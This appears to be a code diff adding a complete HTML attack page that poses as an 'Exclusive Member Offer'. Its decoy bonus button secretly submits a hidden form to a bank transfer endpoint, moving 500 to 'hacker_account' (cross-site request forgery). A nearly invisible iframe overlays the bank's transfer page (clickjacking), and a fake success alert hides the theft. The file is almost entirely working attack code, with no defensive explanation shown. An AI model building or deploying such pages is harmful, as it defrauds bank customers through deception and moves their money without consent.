@@ -1,0 +1,113 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Exclusive Member Offer</title>
+  <style>
+    /* Attractive decoy page */
+    .promo-page {
+      width: 100%;
+      height: 100vh;
+      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+      color: white;
+      font-family: 'Arial', sans-serif;
+      text-align: center;
+      padding-top: 50px;
+    }
+    
+    /* The fake button users will click */
+    .claim-btn {
+      background: #ff9a00;
+      color: white;
+      border: none;
+      padding: 15px 30px;
+      font-size: 18px;
+      border-radius: 50px;
+      cursor: pointer;
+      margin-top: 30px;
+      box-shadow: 0 4px 15px rgba(0,0,0,0.2);
+      position: relative;
+      z-index: 100;
+    }
+    
+    /* Hidden iframe containing the bank form */
+    .hidden-iframe {
+      position: absolute;
+      top: 150px;
+      left: 50%;
+      transform: translateX(-50%);
+      width: 300px;
+      height: 200px;
+      opacity: 0.01;
+      z-index: 1;
+      border: none;
+    }
+    
+    /* Overlay to prevent mouse movement detection */
+    .overlay {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      z-index: 50;
+    }
+  </style>
+</head>
+<body>
+  <div class="promo-page">
+    <h1>Limited Time Offer!</h1>
+    <p>As a valued customer, claim your exclusive bonus now!</p>
+    
+    <!-- The actual attack iframe -->
+    <iframe class="hidden-iframe" name="attackFrame"></iframe>
+    
+    <!-- Form that will be submitted to the iframe -->
+    <form id="hiddenForm" 
+          action="http://vulnerable-bank.com/transfer" 
+          method="POST" 
+          target="attackFrame"
+          style="display:none;">
+      <input type="hidden" name="to" value="hacker_account">
+      <input type="hidden" name="amount" value="500">
+    </form>
+    
+    <!-- The decoy button -->
+    <button class="claim-btn" id="claimButton">CLAIM YOUR BONUS</button>
+    
+    <div class="overlay"></div>
+  </div>
+
+  <script>
+    // When user clicks the decoy button
+    document.getElementById('claimButton').addEventListener('click', function() {
+      // Submit the hidden form
+      document.getElementById('hiddenForm').submit();
+      
+      // Show fake success message
+      setTimeout(() => {
+        alert('Congratulations! Your bonus will be credited within 24 hours!');
+      }, 500);
+    });
+    
+    // Auto-fill and position the iframe when loaded
+    const iframe = document.querySelector('.hidden-iframe');
+    iframe.onload = function() {
+      // Access the iframe's document
+      const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
+      
+      // Fill the form inside iframe
+      iframeDoc.querySelector('input[name="to"]').value = 'hacker_account';
+      iframeDoc.querySelector('input[name="amount"]').value = '500';
+      
+      // Position the form elements under our decoy button
+      const form = iframeDoc.querySelector('form');
+      form.style.position = 'absolute';
+      form.style.top = '0';
+      form.style.left = '0';
+    };
+    
+    // Load the vulnerable page in iframe
+    iframe.src = 'http://localhost:3000/transfer-page';
+  </script>
+</body>
+</html>
